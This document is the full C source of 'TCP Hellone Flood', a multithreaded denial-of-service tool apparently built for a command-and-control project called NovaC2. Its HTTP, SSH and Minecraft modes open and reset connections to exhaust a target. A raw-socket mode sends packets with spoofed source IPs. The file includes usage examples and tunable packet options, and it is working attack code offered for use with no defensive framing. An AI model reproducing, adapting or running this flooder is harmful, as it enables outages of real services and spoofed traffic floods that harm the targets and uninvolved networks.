/*
 * TCP Hellone Flood
 * by c0redev for NovaC2
 *
 * methods: http, ssh, minecraft
 *   default - real TCP sessions with HTTP GET, no spoof
 *   --spoof  - raw packet flood with spoofed source IP
 *
 * usage:
 *   sudo ./hellone <target> <port> <threads> <duration> [options]
 *   sudo ./hellone 1.2.3.4 80 64 30 --method http --domain example.com
 *   sudo ./hellone 1.2.3.4 22 64 30 --method ssh
 *   sudo ./hellone 1.2.3.4 25565 64 30 --method mc
 *   sudo ./hellone 1.2.3.4 80 16 30 --spoof
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/poll.h>

#define MAX_THREADS 256
#define BUF_SZ 8192
#define PAYLOAD_MAX 1460

enum method { METHOD_HTTP, METHOD_SSH, METHOD_MC };

struct config {
    char target_ip[32];
    uint16_t target_port;
    uint32_t threads;
    uint32_t duration;
    enum method method;

    uint8_t spoof;
    char domain[256];

    uint8_t ip_tos;
    uint16_t ip_ident;
    uint8_t ip_ttl;
    uint8_t dont_frag;
    uint32_t payload_size;
    uint8_t payload_random;

    volatile uint8_t running;
    uint64_t total_ops;
};

struct thread_data {
    int id;
    uint32_t target_addr;
    uint64_t ops;
};

static struct config cfg;
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
static uint32_t rs[4];

static void rand_init(void) {
    rs[0] = time(NULL);
    rs[1] = getpid() ^ getppid();
    rs[2] = clock();
    rs[3] = rs[2] ^ rs[1];
}

static uint32_t rand_next(void) {
    uint32_t t = rs[0];
    t ^= t << 11;
    t ^= t >> 8;
    rs[0] = rs[1];
    rs[1] = rs[2];
    rs[2] = rs[3];
    rs[3] ^= rs[3] >> 19;
    rs[3] ^= t;
    return rs[3];
}

static void rand_bytes(char *buf, int len) {
    while (len > 0) {
        if (len >= 4) {
            *(uint32_t *)buf = rand_next();
            buf += 4;
            len -= 4;
        } else {
            *buf++ = rand_next() & 0xFF;
            len--;
        }
    }
}

static int tcp_connect(struct sockaddr_in *addr) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    int ret = connect(sock, (struct sockaddr *)addr, sizeof(*addr));
    if (ret < 0 && errno != EINPROGRESS) { close(sock); return -1; }

    struct pollfd pfd = { sock, POLLOUT, 0 };
    ret = poll(&pfd, 1, 5000);
    if (ret <= 0 || !(pfd.revents & POLLOUT)) { close(sock); return -1; }

    int err;
    socklen_t elen = sizeof(err);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &elen);
    if (err) { close(sock); return -1; }

    return sock;
}

static void tcp_rst_close(int sock) {
    struct linger l = {1, 0};
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
    close(sock);
}


static void *http_worker(void *arg) {
    struct thread_data *td = arg;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = td->target_addr;
    addr.sin_port = htons(cfg.target_port);

    char req[512];
    const char *host = cfg.domain[0] ? cfg.domain : cfg.target_ip;
    int reqlen = snprintf(req, sizeof(req),
        "GET / HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n"
        "Accept: */*\r\n"
        "Connection: keep-alive\r\n"
        "\r\n", host);

    char buf[BUF_SZ];
    time_t end = time(NULL) + cfg.duration;

    while (cfg.running && time(NULL) < end) {
        int sock = tcp_connect(&addr);
        if (sock < 0) continue;

        send(sock, req, reqlen, 0);
        recv(sock, buf, sizeof(buf) - 1, MSG_DONTWAIT);
        tcp_rst_close(sock);
        td->ops++;
    }

    pthread_mutex_lock(&lock);
    cfg.total_ops += td->ops;
    pthread_mutex_unlock(&lock);
    return NULL;
}

static void *ssh_worker(void *arg) {
    struct thread_data *td = arg;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = td->target_addr;
    addr.sin_port = htons(cfg.target_port);

    const char *banner = "SSH-2.0-Hellone_1.0\r\n";
    int blen = strlen(banner);
    char buf[BUF_SZ];
    time_t end = time(NULL) + cfg.duration;

    while (cfg.running && time(NULL) < end) {
        int sock = tcp_connect(&addr);
        if (sock < 0) continue;

        send(sock, banner, blen, 0);
        recv(sock, buf, sizeof(buf) - 1, MSG_DONTWAIT);
        tcp_rst_close(sock);
        td->ops++;
    }

    pthread_mutex_lock(&lock);
    cfg.total_ops += td->ops;
    pthread_mutex_unlock(&lock);
    return NULL;
}

/* ── Minecraft worker ── */
struct mc_buf { unsigned char data[2048]; int len; };

static void mc_vwi(struct mc_buf *b, int v) {
    do {
        unsigned char byte = v & 0x7F;
        v >>= 7;
        if (v) byte |= 0x80;
        b->data[b->len++] = byte;
    } while (v);
}

static void mc_wstr(struct mc_buf *b, const char *s) {
    int slen = strlen(s);
    mc_vwi(b, slen);
    memcpy(b->data + b->len, s, slen);
    b->len += slen;
}

static void mc_wshort(struct mc_buf *b, uint16_t v) {
    b->data[b->len++] = (v >> 8) & 0xFF;
    b->data[b->len++] = v & 0xFF;
}

static void mc_build_pkt(struct mc_buf *raw, struct mc_buf *pkt) {
    raw->len = 0;
    mc_vwi(raw, pkt->len);
    memcpy(raw->data + raw->len, pkt->data, pkt->len);
    raw->len += pkt->len;
}

static void *mc_worker(void *arg) {
    struct thread_data *td = arg;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = td->target_addr;
    addr.sin_port = htons(cfg.target_port);

    const char *host = cfg.domain[0] ? cfg.domain : cfg.target_ip;
    time_t end = time(NULL) + cfg.duration;
    char buf[BUF_SZ];

    struct mc_buf handshake, raw;
    handshake.len = 0;
    mc_vwi(&handshake, 0);        // packet id
    mc_vwi(&handshake, 767);      // protocol (1.21)
    mc_wstr(&handshake, host);
    mc_wshort(&handshake, cfg.target_port);
    mc_vwi(&handshake, 1);        // next state: status

    struct mc_buf status;
    status.len = 0;
    mc_vwi(&status, 0);           // packet id

    while (cfg.running && time(NULL) < end) {
        int sock = tcp_connect(&addr);
        if (sock < 0) continue;

        mc_build_pkt(&raw, &handshake);
        send(sock, raw.data, raw.len, 0);

        mc_build_pkt(&raw, &status);
        send(sock, raw.data, raw.len, 0);

        recv(sock, buf, sizeof(buf) - 1, MSG_DONTWAIT);
        tcp_rst_close(sock);
        td->ops++;
    }

    pthread_mutex_lock(&lock);
    cfg.total_ops += td->ops;
    pthread_mutex_unlock(&lock);
    return NULL;
}

static uint16_t cksum(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    for (sum = 0; count > 1; count -= 2) sum += *addr++;
    if (count == 1) sum += *(uint8_t *)addr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

static uint16_t cksum_tcp(struct iphdr *iph, struct tcphdr *tcph,
                          uint16_t data_len, int len) {
    uint16_t *buf = (uint16_t *)tcph;
    uint32_t sum = 0;
    while (len > 1) { sum += *buf++; len -= 2; }
    if (len == 1) sum += *(uint8_t *)buf;
    sum += (iph->saddr >> 16) & 0xFFFF;
    sum += iph->saddr & 0xFFFF;
    sum += (iph->daddr >> 16) & 0xFFFF;
    sum += iph->daddr & 0xFFFF;
    sum += htons(IPPROTO_TCP);
    sum += data_len;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

static void *spoof_worker(void *arg) {
    struct thread_data *td = arg;

    int raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw < 0) {
        fprintf(stderr, "[t%d] raw socket: %s\n", td->id, strerror(errno));
        return NULL;
    }

    int one = 1;
    setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int pktsz = sizeof(struct iphdr) + sizeof(struct tcphdr) + cfg.payload_size;
    char *pkt = malloc(pktsz);
    if (!pkt) { close(raw); return NULL; }

    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
    char *payload = pkt + sizeof(struct iphdr) + sizeof(struct tcphdr);
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = td->target_addr;

    time_t end = time(NULL) + cfg.duration;

    while (cfg.running && time(NULL) < end) {
        memset(iph, 0, sizeof(*iph));
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = cfg.ip_tos;
        iph->tot_len = htons(pktsz);
        iph->id = htons(cfg.ip_ident == 0xFFFF
                       ? (rand_next() & 0xFFFF)
                       : cfg.ip_ident);
        iph->ttl = cfg.ip_ttl;
        if (cfg.dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = rand_next();
        iph->daddr = td->target_addr;

        memset(tcph, 0, sizeof(*tcph));
        tcph->source = htons(rand_next() & 0xFFFF);
        tcph->dest = htons(cfg.target_port);
        tcph->doff = 5;
        tcph->window = htons(65535);
        tcph->ack = 1;
        tcph->psh = 1;
        tcph->seq = htonl(rand_next());
        tcph->ack_seq = htonl(rand_next());

        if (cfg.payload_random)
            rand_bytes(payload, cfg.payload_size);
        else
            memset(payload, 'A', cfg.payload_size);

        iph->check = 0;
        iph->check = cksum((uint16_t *)iph, sizeof(*iph));
        tcph->check = 0;
        tcph->check = cksum_tcp(iph, tcph,
            htons(sizeof(*tcph) + cfg.payload_size),
            sizeof(*tcph) + cfg.payload_size);

        sendto(raw, pkt, pktsz, MSG_NOSIGNAL,
               (struct sockaddr *)&dst, sizeof(dst));
        td->ops++;
    }

    free(pkt);
    close(raw);

    pthread_mutex_lock(&lock);
    cfg.total_ops += td->ops;
    pthread_mutex_unlock(&lock);
    return NULL;
}

static void sigint(int sig) {
    (void)sig;
    fprintf(stderr, "\n[*] stopping...\n");
    cfg.running = 0;
}

static void usage(const char *prog) {
    fprintf(stderr,
        "TCP Hellone Flood - by c0redev for NovaC2\n\n"
        "usage: sudo %s <target> <port> <threads> <duration> [options]\n\n"
        "options:\n"
        "  --method <http|ssh|mc>   attack method (default: http)\n"
        "  --spoof                  spoof source IP (raw flood)\n"
        "  --domain <host>          Host header / server address\n"
        "  --tos <val>              IP type of service (default: 0)\n"
        "  --ttl <val>              IP TTL (default: 64)\n"
        "  --ident <val>            IP identification (default: random)\n"
        "  --df                     set Don't Fragment\n"
        "  --size <val>             payload size (default: 512, spoof only)\n"
        "  --static                 static payload (default: random)\n\n"
        "examples:\n"
        "  sudo %s 1.2.3.4 80 64 30 --method http --domain example.com\n"
        "  sudo %s 1.2.3.4 22 64 30 --method ssh\n"
        "  sudo %s 1.2.3.4 25565 64 30 --method mc\n"
        "  sudo %s 1.2.3.4 80 16 30 --spoof --size 1024\n",
        prog, prog, prog, prog, prog);
}

int main(int argc, char **argv) {
    if (argc < 5) { usage(argv[0]); return 1; }
    if (geteuid() != 0) { fprintf(stderr, "must run as root\n"); return 1; }

    memset(&cfg, 0, sizeof(cfg));
    strncpy(cfg.target_ip, argv[1], sizeof(cfg.target_ip) - 1);
    cfg.target_port = atoi(argv[2]);
    cfg.threads = atoi(argv[3]);
    cfg.duration = atoi(argv[4]);

    cfg.method = METHOD_HTTP;
    cfg.ip_ttl = 64;
    cfg.payload_size = 512;
    cfg.payload_random = 1;
    cfg.running = 1;

    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--method") == 0 && i + 1 < argc) {
            i++;
            if (strcmp(argv[i], "ssh") == 0) cfg.method = METHOD_SSH;
            else if (strcmp(argv[i], "mc") == 0) cfg.method = METHOD_MC;
            else if (strcmp(argv[i], "http") == 0) cfg.method = METHOD_HTTP;
        } else if (strcmp(argv[i], "--spoof") == 0)
            cfg.spoof = 1;
        else if (strcmp(argv[i], "--domain") == 0 && i + 1 < argc)
            strncpy(cfg.domain, argv[++i], sizeof(cfg.domain) - 1);
        else if (strcmp(argv[i], "--tos") == 0 && i + 1 < argc)
            cfg.ip_tos = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ttl") == 0 && i + 1 < argc)
            cfg.ip_ttl = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ident") == 0 && i + 1 < argc)
            cfg.ip_ident = atoi(argv[++i]);
        else if (strcmp(argv[i], "--df") == 0)
            cfg.dont_frag = 1;
        else if (strcmp(argv[i], "--size") == 0 && i + 1 < argc)
            cfg.payload_size = atoi(argv[++i]);
        else if (strcmp(argv[i], "--static") == 0)
            cfg.payload_random = 0;
    }

    if (cfg.threads < 1 || cfg.threads > MAX_THREADS) {
        fprintf(stderr, "threads must be 1-%d\n", MAX_THREADS);
        return 1;
    }

    if (cfg.payload_size > PAYLOAD_MAX)
        fprintf(stderr, "warning: payload > %d may fragment\n", PAYLOAD_MAX);

    uint32_t target_addr = inet_addr(cfg.target_ip);
    if (target_addr == 0 || target_addr == 0xFFFFFFFF) {
        fprintf(stderr, "invalid target IP\n");
        return 1;
    }

    if (cfg.spoof && cfg.method != METHOD_HTTP) {
        fprintf(stderr, "spoof mode forces HTTP method, ignoring --method\n");
        cfg.method = METHOD_HTTP;
    }

    rand_init();
    signal(SIGINT, sigint);
    signal(SIGTERM, sigint);

    const char *mname[] = { "HTTP", "SSH", "Minecraft" };

    fprintf(stderr,
        "\n"
        "  have? :)\n"
        "\n"
        "  Hellone - by c0redev for NovaC2\n"
        "  mode: %s%s\n"
        "\n",
        cfg.spoof ? "SPOOF (raw flood) " : "",
        cfg.spoof ? "" : mname[cfg.method]);

    fprintf(stderr,
        "  target: %s:%d\n"
        "  threads: %d\n"
        "  duration: %ds\n",
        cfg.target_ip, cfg.target_port, cfg.threads, cfg.duration);

    if (!cfg.spoof && cfg.domain[0])
        fprintf(stderr, "  domain: %s\n", cfg.domain);
    if (cfg.spoof) {
        fprintf(stderr, "  payload: %d (%s)\n",
                cfg.payload_size,
                cfg.payload_random ? "random" : "static");
        if (cfg.dont_frag) fprintf(stderr, "  df: on\n");
    }

    fprintf(stderr, "\n  starting...\n\n");

    void *(*worker)(void *) = cfg.spoof ? spoof_worker :
        cfg.method == METHOD_SSH ? ssh_worker :
        cfg.method == METHOD_MC ? mc_worker :
        http_worker;

    pthread_t *threads = malloc(cfg.threads * sizeof(pthread_t));
    if (!threads) { fprintf(stderr, "malloc failed\n"); return 1; }

    for (uint32_t i = 0; i < cfg.threads; i++) {
        struct thread_data *td = malloc(sizeof(*td));
        td->id = i + 1;
        td->target_addr = target_addr;
        td->ops = 0;
        if (pthread_create(&threads[i], NULL, worker, td) != 0)
            { fprintf(stderr, "failed thread %d\n", i + 1); free(td); }
        usleep(50000);
    }

    fprintf(stderr, "  running for %d seconds...\n\n", cfg.duration);

    for (uint32_t i = 0; i < cfg.threads; i++)
        pthread_join(threads[i], NULL);

    free(threads);

    fprintf(stderr,
        "\n[*] done\n"
        "    total ops: %llu\n"
        "    avg ops/s: %llu\n",
        (unsigned long long)cfg.total_ops,
        (unsigned long long)(cfg.duration > 0
            ? cfg.total_ops / cfg.duration : 0));

    return 0;
}
